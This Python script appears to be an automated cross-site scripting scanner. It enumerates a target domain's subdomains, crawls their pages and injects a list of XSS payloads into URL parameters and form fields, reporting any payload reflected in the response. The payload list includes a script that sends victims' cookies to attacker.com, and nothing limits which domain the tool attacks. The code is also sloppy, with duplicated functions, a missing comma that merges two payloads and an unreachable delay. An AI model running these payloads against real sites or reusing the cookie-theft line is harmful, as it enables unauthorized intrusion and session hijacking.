import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import urllib.parse
import sublist3r
import tldextract
import time

# Common XSS Payloads
xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<input type="text" value="test" onfocus=alert(1) autofocus>',
    '<script>var i = new Image(); i.src = "http://attacker.com/steal?cookie=" + document.cookie; </script>'
    '<iframe src=javascript&#x3A;alert(document.cookie)></iframe>',
    '<script>var x = "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;";document.write(x);</script>'
]

# Set to keep track of crawled URLs to avoid duplicates
crawled_urls = set()

# Function to find subdomains using sublist3r
def find_subdomains(domain):
    print(f"Discovering subdomains for: {domain}")
    subdomains = sublist3r.main(domain, 40, None, ports=None, silent=True, verbose=False, enable_bruteforce=False, engines=None)
    # Convert the set to a list
    subdomains = list(subdomains)
    subdomains.append(domain)  # Include the main domain in the scan
    return subdomains

# Function to find subdomains using sublist3r
def find_subdomains(domain):
    print(f"Discovering subdomains for: {domain}")
    subdomains = sublist3r.main(domain, 40, None, ports=None, silent=True, verbose=False, enable_bruteforce=False, engines=None)
    # Convert the set to a list
    subdomains = list(subdomains)
    subdomains.append(domain)  # Include the main domain in the scan
    return subdomains

# Main function to orchestrate the crawling and XSS testing
def main(domain):
    print(f"Scanning domain and subdomains for XSS: {domain}")

    # Find subdomains
    subdomains = find_subdomains(domain)

    for subdomain in subdomains:
        print(f"\nCrawling subdomain: {subdomain}")
        subdomain_urls = crawl(f"https://{subdomain}", subdomain)

        if subdomain_urls:
            for url in subdomain_urls:
                print(f"Testing URL: {url}")
                # Test URL parameters for XSS
                test_xss(url, xss_payloads)
                # Test forms on the page for XSS
                find_forms_and_test(url, xss_payloads)
                    
# Set up a global requests session with retries
session = requests.Session()

# Retry strategy for the session
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

retry = Retry(
    total=5,               # Total number of retries
    backoff_factor=1,      # Wait time between retries (1s, 2s, 4s, etc.)
    status_forcelist=[500, 502, 503, 504]  # Retry on these HTTP status codes
)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)

# Function to crawl a URL and find all internal links
""" def crawl(url, domain):
    if url in crawled_urls:
        return

    # Force HTTP instead of HTTPS
    if url.startswith('https://'):
        url = url.replace('https://', 'http://')

    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        crawled_urls.add(url)

        # Find all anchor tags
        for link in soup.find_all('a'):
            href = link.get('href')
            if href:
                # Construct absolute URL
                href = urllib.parse.urljoin(url, href)
                parsed_href = urllib.parse.urlparse(href)
                # Check if the link is internal
                if domain in parsed_href.netloc:
                    if href not in crawled_urls:
                        crawl(href, domain)

        return crawled_urls

    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to crawl {url}: {e}")
        return """

def crawl(url, domain):
    if url in crawled_urls:
        return

    # Check both HTTP and HTTPS
    for protocol in ['http://', 'https://']:
        test_url = url.replace('https://', protocol).replace('http://', protocol)

        try:
            response = session.get(test_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            crawled_urls.add(test_url)

            # Find all anchor tags
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    # Construct absolute URL
                    href = urllib.parse.urljoin(test_url, href)
                    parsed_href = urllib.parse.urlparse(href)
                    # Check if the link is internal
                    if domain in parsed_href.netloc:
                        if href not in crawled_urls:
                            crawl(href, domain)

            return crawled_urls

        except requests.exceptions.RequestException as e:
            print(f"[-] Failed to crawl {test_url}: {e}")
            continue  # Try the next protocol


# The rest of your code (main, find_subdomains, etc.)

    time.sleep(2)  # Add a 2-second delay between requests

# Function to inject XSS payloads into URL's parameters
def inject_payloads(url, payloads):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    results = []

    for payload in payloads:
        for param in query_params.keys():
            temp_params = query_params.copy()
            temp_params[param] = payload
            new_query = urllib.parse.urlencode(temp_params, doseq=True)
            new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            results.append((new_url, param, payload))

    return results

# Function to test XSS vulnerabilities
def test_xss(url, payloads):
    vulnerable = False
    payload_tests = inject_payloads(url, payloads)

    for test_url, param, payload in payload_tests:
        try:
            response = requests.get(test_url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Check if the payload is reflected in the HTML response
            if payload in soup.text:
                print(f"[+] Potential XSS vulnerability found!")
                print(f"URL: {test_url}")
                print(f"Parameter: {param}")
                print(f"Payload: {payload}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(f"[-] Request to {test_url} failed: {e}")

    return vulnerable

# Function to find forms on a page and test them for XSS
""" def find_forms_and_test(url, payloads):
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            action = form.get('action')
            if not action or action.startswith('javascript:') or action == 'void(0)':
                # Skip forms with invalid actions
                print(f"[-] Skipping form with action: {action}")
                continue

            form_url = urllib.parse.urljoin(url, action)
            inputs = form.find_all('input')

            for payload in payloads:
                data = {}
                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type')

                    if input_name:
                        if input_type == 'text':
                            data[input_name] = payload
                        else:
                            data[input_name] = 'test'

                try:
                    response = session.post(form_url, data=data)
                    if payload in response.text:
                        print(f"[+] Potential XSS vulnerability found in form!")
                        print(f"Form URL: {form_url}")
                        print(f"Payload: {payload}")
                except requests.exceptions.RequestException as e:
                    print(f"[-] Could not submit form to {form_url}: {e}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Could not connect to {url}: {e}") """
        
def find_forms_and_test(url, payloads):
    try:
        response = session.get(url, timeout=10)  # Set a timeout for the GET request
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            action = form.get('action')
            if not action or action.startswith('javascript:') or action == 'void(0)':
                # Skip forms with invalid actions
                print(f"[-] Skipping form with action: {action}")
                continue

            form_url = urllib.parse.urljoin(url, action)
            inputs = form.find_all('input')

            for payload in payloads:
                data = {}
                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type')

                    if input_name:
                        if input_type == 'text':
                            data[input_name] = payload
                        else:
                            data[input_name] = 'test'

                try:
                    # Set a timeout for the POST request
                    response = session.post(form_url, data=data, timeout=10)
                    if payload in response.text:
                        print(f"[+] Potential XSS vulnerability found in form!")
                        print(f"Form URL: {form_url}")
                        print(f"Payload: {payload}")
                except requests.exceptions.RequestException as e:
                    print(f"[-] Could not submit form to {form_url}: {e}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Could not connect to {url}: {e}")



# Main function to orchestrate the crawling and XSS testing
def main(domain):
    print(f"Scanning domain and subdomains for XSS: {domain}")

    # Find subdomains
    subdomains = find_subdomains(domain)

    for subdomain in subdomains:
        print(f"\nCrawling subdomain: {subdomain}")
        subdomain_urls = crawl(f"https://{subdomain}", subdomain)

        if subdomain_urls:
            for url in subdomain_urls:
                print(f"Testing URL: {url}")
                # Test URL parameters for XSS
                test_xss(url, xss_payloads)
                # Test forms on the page for XSS
                find_forms_and_test(url, xss_payloads)

""" if __name__ == "__main__":
    target_domain = input("Enter the target domain (e.g., example.com): ")
    # Extract domain to handle subdomains correctly
    extracted_domain = tldextract.extract(target_domain).registered_domain
    main(extracted_domain) """

if __name__ == "__main__":
    try:
        target_domain = input("Enter the target domain (e.g., example.com): ")
        # Extract domain to handle subdomains correctly
        extracted_domain = tldextract.extract(target_domain).registered_domain
        main(extracted_domain)
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by the user. Exiting gracefully...")
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")
